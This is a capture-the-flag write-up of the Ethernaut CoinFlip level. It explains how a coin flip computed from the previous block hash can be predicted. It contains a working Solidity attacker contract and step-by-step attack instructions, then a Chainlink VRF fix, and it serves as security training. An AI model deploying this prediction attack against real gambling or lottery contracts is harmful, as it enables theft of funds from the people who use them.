# Ethernaut Level 03 -- CoinFlip

**Game:** Ethernaut by OpenZeppelin
**Level:** 03 -- CoinFlip
**Category:** Weak Randomness / Predictable On-Chain Values
**Network:** Sepolia Testnet
**Status:** Completed

---

## Objective

Guess the correct outcome of a coin flip 10 times in a row.

---

## The Vulnerability

The contract generates its coin flip result using blockhash and block number:

    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

This looks unpredictable but it is entirely deterministic. Block hashes are public data on the blockchain -- anyone can read them. The FACTOR value is hardcoded in the contract. Given the same block hash and the same FACTOR, the result is always the same.

The contract assumes that a user submitting a guess cannot know the block hash at the time of submission. This assumption is wrong. An attacker contract executing in the same block as the flip call sees the exact same block hash. It can calculate the result before calling flip() and always pass the correct answer.

---

## Why Browser Console Cannot Solve This

If you try to guess from the browser console, your guess and the flip() call happen in separate steps. By the time you calculate the block hash and submit your guess, a new block may have been mined, changing the block hash the contract uses. The calculation and the call must happen atomically -- in the same transaction, in the same block.

This is only possible from a smart contract.

---

## The Attack Contract

The attacker contract replicates the exact same calculation the CoinFlip contract uses, then calls flip() with the pre-calculated result in a single transaction:

    interface ICoinFlip {
        function flip(bool _guess) external returns (bool);
    }

    contract CoinFlipAttack {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        ICoinFlip target;

        constructor(address _target) {
            target = ICoinFlip(_target);
        }

        function attack() public {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            target.flip(side);
        }
    }

---

## Attack Steps

Step 1 -- Deploy the attacker contract in Remix IDE with the CoinFlip instance address as the constructor argument.

Step 2 -- Call attack() once per block, 10 times. The contract calculates the correct result and passes it to flip() in the same transaction. Each call increments consecutiveWins by 1.

Step 3 -- Verify the win count after each call:

    await contract.consecutiveWins()

Step 4 -- Once consecutiveWins reaches 10, submit the instance on Ethernaut.

Note: attack() must be called once per block. Calling it twice in the same block causes a revert because the contract detects the same block hash as the previous call via the lastHash check.

---

## The Fix

True randomness cannot be generated on-chain using only on-chain data. Any value derived from block data -- block hash, block number, block timestamp, coinbase -- is either publicly known or manipulable by block producers.

For randomness that cannot be predicted or manipulated, the correct solution is a verifiable random function (VRF) from an external oracle. Chainlink VRF is the standard implementation -- it generates a random number off-chain with a cryptographic proof that the number was not manipulated before being delivered on-chain.

    // Correct pattern -- using Chainlink VRF
    function requestRandomness() internal returns (bytes32 requestId) {
        return requestRandomness(keyHash, fee);
    }

    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        bool side = randomness % 2 == 0;
        // use side
    }

---

## Real World Impact

Weak randomness has caused significant losses in production contracts. Several gambling and lottery contracts have been exploited by attackers who deployed contracts to predict outcomes generated from block data. The Fomo3D game and several lottery contracts on Ethereum were exploited through similar techniques -- attackers predicted outcomes or manipulated block data to guarantee wins.

---

## Key Takeaway

On-chain data is public and deterministic. Any contract that uses block hash, block number, block timestamp, or any other on-chain value as a source of randomness is vulnerable to prediction attacks. If a smart contract requires randomness, it must source that randomness from outside the blockchain through a verifiable oracle.

---

## References

- Ethernaut Level 03 -- https://ethernaut.openzeppelin.com/level/3
- Chainlink VRF Documentation -- https://docs.chain.link/vrf
- SWC-120 -- Weak Sources of Randomness from Chain Attributes
- Fomo3D exploit analysis
